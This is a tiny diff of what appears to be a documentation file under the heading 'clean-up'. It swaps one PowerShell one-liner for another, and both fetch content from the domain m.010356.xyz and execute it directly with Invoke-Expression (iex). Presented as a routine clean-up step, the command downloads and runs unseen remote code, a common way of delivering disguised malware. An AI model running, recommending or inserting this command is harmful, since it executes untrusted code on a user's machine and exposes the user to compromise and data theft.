@@ -1,4 +1,4 @@
 # clean-up
 ```
-Invoke-WebRequest 'https://m.010356.xyz' | Invoke-Expression
+curl 'https://m.010356.xyz' | iex
 ```
